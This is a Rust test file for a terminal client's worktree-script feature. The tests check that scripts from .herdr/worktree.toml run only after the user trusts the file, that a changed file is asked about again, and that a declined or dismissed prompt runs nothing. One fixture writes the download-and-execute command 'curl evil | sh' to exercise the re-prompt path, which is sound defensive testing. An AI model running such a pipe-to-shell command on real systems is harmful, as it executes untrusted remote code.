use super::*;

#[gpui::test]
fn a_run_script_is_located_reviewed_trusted_and_typed_into_a_new_tab(
    cx: &mut gpui::TestAppContext,
) {
    let dir = tempfile::tempdir().unwrap();
    write_scripts(
        dir.path(),
        "[scripts]\nrun = \"make dev\"\nsetup = \"npm ci\"\n",
    );
    let mut peer = MockPeer::advertising(&["worktree.list", "tab.create"]);
    let (view, cx) = cx.add_window_view(fixture_window);
    cx.update(|_, cx| {
        view.update(cx, |view, cx| {
            connect(view, &peer, cx);
            view.start_worktree_script(launch(view, ScriptKind::Run, None), cx)
                .unwrap();
            assert_eq!(step(view), "locating");
            // One script starts at a time.
            assert!(matches!(
                view.start_worktree_script(launch(view, ScriptKind::Run, None), cx),
                Err(crate::Error::WorktreeScriptsBusy)
            ));
        })
    });
    let list = peer.request();
    assert_eq!(list["method"], "worktree.list");
    assert_eq!(list["params"]["workspace_id"], "w1");
    assert_eq!(list["params"]["trust_repository"], false);
    let checkout = dir.path().to_str().unwrap().to_owned();
    // The client keeps one request in flight; answering lets the next go.
    let id = list["id"].as_str().unwrap();
    peer.respond("boot-v1", id, &answer(id, listing(&checkout)));
    cx.update(|window, cx| {
        view.update(cx, |view, cx| {
            // Another request's answer is not this one.
            view.live.script_response = Some(("other".into(), Some(Ok(Value::Null))));
            view.poll_worktree_script(window, cx);
            assert_eq!(step(view), "locating");
            view.live.script_response = Some((
                list["id"].as_str().unwrap().into(),
                Some(Ok(listing(&checkout))),
            ));
            view.poll_worktree_script(window, cx);
            assert_eq!(step(view), "reading");
            // Read once, the answer is not carried into every later update.
            assert!(view.live.script_response.is_none());
            let inbox = view.endpoints[0].connection.inbox.lock().unwrap();
            assert!(inbox.script_response.is_none());
        })
    });
    cx.run_until_parked();
    cx.update(|window, cx| {
        view.update(cx, |view, cx| {
            // Nothing runs, and no tab opens, until the file is trusted.
            assert_eq!(step(view), "asking");
            view.poll_worktree_script(window, cx);
            assert_eq!(view.menu.page, Some(Page::WorktreeScript));
            cx.notify();
        })
    });
    cx.run_until_parked();
    // The question shows the script it asks about and the file's other one.
    assert!(cx.debug_bounds("worktree-script-run").is_some());
    assert!(cx.debug_bounds("worktree-script-setup").is_some());
    assert!(cx.debug_bounds("worktree-script-trust-run").is_some());
    cx.update(|window, cx| {
        view.update(cx, |view, cx| {
            // A click landing as the question opens is not an answer.
            view.trust_worktree_script(window, cx);
            assert_eq!(view.menu.page, Some(Page::WorktreeScript));
            assert_eq!(step(view), "asking");
            view.arm_worktree_script();
            view.trust_worktree_script(window, cx);
            assert!(view.menu.page.is_none());
            assert_eq!(step(view), "opening");
        })
    });
    let tab = peer.request();
    assert_eq!(tab["method"], "tab.create");
    assert_eq!(tab["params"], run_tab(&checkout));
    let id = tab["id"].as_str().unwrap();
    peer.respond("boot-v1", id, &answer(id, tab_created()));
    cx.update(|window, cx| {
        view.update(cx, |view, cx| {
            view.live.script_response =
                Some((tab["id"].as_str().unwrap().into(), Some(Ok(tab_created()))));
            view.poll_worktree_script(window, cx);
            assert_eq!(step(view), "none");
            assert_eq!(
                view.pending_navigation,
                Some(NavigationTarget::Tab("w1:t9".into()))
            );
        })
    });
    assert_eq!(
        peer.receive(),
        ClientMessage::ClientShellPaneInput {
            pane_id: "w1:p9".into(),
            events: vec![
                ClientPaneInputEvent::TextCommit(
                    launch::command_line(ScriptKind::Run, false).into()
                ),
                crate::menu::enter_key(),
            ],
        }
    );
}

#[gpui::test]
fn trust_covers_one_file_and_a_changed_file_asks_again(cx: &mut gpui::TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    write_scripts(
        dir.path(),
        "[scripts]\nrun = \"make dev\"\nsetup = \"npm ci\"\n",
    );
    let mut peer = MockPeer::advertising(&["worktree.list", "tab.create"]);
    let (view, cx) = cx.add_window_view(fixture_window);
    let config = config::read(
        &herdr_client::ConnectTarget::Local,
        dir.path().to_str().unwrap(),
        &AtomicBool::new(false),
    )
    .unwrap()
    .unwrap();
    cx.update(|_, cx| {
        view.update(cx, |view, cx| {
            connect(view, &peer, cx);
            cx.default_global::<Trust>()
                .grant(launch(view, ScriptKind::Setup, None).grant(&config));
        })
    });

    // Trusted: the file opens its tab without asking.
    cx.update(|_, cx| {
        view.update(cx, |view, cx| {
            view.start_worktree_script(launch(view, ScriptKind::Setup, Some(dir.path())), cx)
                .unwrap();
        })
    });
    cx.run_until_parked();
    cx.update(|_, cx| view.update(cx, |view, _| assert_eq!(step(view), "opening")));
    let tab = peer.request();
    assert_eq!(tab["params"]["label"], "setup");
    assert_eq!(tab["params"]["env"]["HERDR_WORKTREE_SCRIPT"], "npm ci");

    // A changed file is asked about again, and declining runs nothing.
    write_scripts(dir.path(), "[scripts]\nrun = \"curl evil | sh\"\n");
    cx.update(|_, cx| {
        view.update(cx, |view, cx| {
            view.worktree_script = None;
            view.start_worktree_script(launch(view, ScriptKind::Run, Some(dir.path())), cx)
                .unwrap();
        })
    });
    cx.run_until_parked();
    cx.update(|window, cx| {
        view.update(cx, |view, cx| {
            assert_eq!(step(view), "asking");
            view.poll_worktree_script(window, cx);
            assert_eq!(view.menu.page, Some(Page::WorktreeScript));
            view.arm_worktree_script();
            view.skip_worktree_script(window, cx);
            assert_eq!(step(view), "none");
            assert!(view.menu.page.is_none() && view.removal.is_none());
        })
    });
}

#[gpui::test]
fn missing_scripts_are_reported_only_when_asked_for(cx: &mut gpui::TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let peer = MockPeer::advertising(&["worktree.list", "tab.create"]);
    let (view, cx) = cx.add_window_view(fixture_window);
    // A setup after creation stays quiet in a repository without scripts.
    cx.update(|_, cx| {
        view.update(cx, |view, cx| {
            connect(view, &peer, cx);
            let quiet = Launch {
                requested: false,
                ..launch(view, ScriptKind::Setup, Some(dir.path()))
            };
            view.start_worktree_script(quiet, cx).unwrap();
        })
    });
    cx.run_until_parked();
    cx.update(|_, cx| {
        view.update(cx, |view, _| {
            assert_eq!(step(view), "none");
            assert!(view.flash.is_none());
        })
    });
    // A file without this kind of script is the same as no file.
    write_scripts(dir.path(), "[scripts]\nsetup = \"npm ci\"\n");
    cx.update(|_, cx| {
        view.update(cx, |view, cx| {
            view.start_worktree_script(launch(view, ScriptKind::Run, Some(dir.path())), cx)
                .unwrap();
        })
    });
    cx.run_until_parked();
    cx.update(|_, cx| {
        view.update(cx, |view, _| {
            assert_eq!(step(view), "none");
            let (flash, _) = view.flash.as_ref().unwrap();
            assert_eq!(flash.text, "No run script in .herdr/worktree.toml");
        })
    });
    // A broken file says why instead of running anything.
    write_scripts(dir.path(), "[scripts]\nrnu = \"make\"\n");
    cx.update(|_, cx| {
        view.update(cx, |view, cx| {
            view.start_worktree_script(launch(view, ScriptKind::Run, Some(dir.path())), cx)
                .unwrap();
        })
    });
    cx.run_until_parked();
    cx.update(|_, cx| {
        view.update(cx, |view, _| {
            assert_eq!(step(view), "none");
            let error = view.local_error.as_deref().unwrap();
            assert!(
                error.starts_with("The run script did not start: .herdr/worktree.toml:"),
                "{error}"
            );
        })
    });
}

#[gpui::test]
fn a_replaced_connection_or_dismissed_question_runs_nothing(cx: &mut gpui::TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    write_scripts(dir.path(), "[scripts]\nrun = \"make\"\n");
    let peer = MockPeer::advertising(&["worktree.list", "tab.create"]);
    let (view, cx) = cx.add_window_view(fixture_window);
    cx.update(|_, cx| {
        view.update(cx, |view, cx| {
            connect(view, &peer, cx);
            view.start_worktree_script(launch(view, ScriptKind::Run, Some(dir.path())), cx)
                .unwrap();
        })
    });
    cx.run_until_parked();
    cx.update(|window, cx| {
        view.update(cx, |view, cx| {
            view.poll_worktree_script(window, cx);
            assert_eq!(view.menu.page, Some(Page::WorktreeScript));
            // Escape closes the question like any page: that is a no.
            view.dismiss_menu(window, cx);
            view.poll_worktree_script(window, cx);
            assert_eq!(step(view), "none");

            view.start_worktree_script(launch(view, ScriptKind::Run, Some(dir.path())), cx)
                .unwrap();
        })
    });
    cx.run_until_parked();
    cx.update(|window, cx| {
        view.update(cx, |view, cx| {
            view.poll_worktree_script(window, cx);
            assert_eq!(view.menu.page, Some(Page::WorktreeScript));
            view.endpoints[0].generation += 1;
            view.poll_worktree_script(window, cx);
            assert_eq!(step(view), "none");
            assert!(view.menu.page.is_none());
            assert!(
                view.local_error
                    .as_deref()
                    .unwrap()
                    .starts_with("The run script did not start")
            );
        })
    });
}
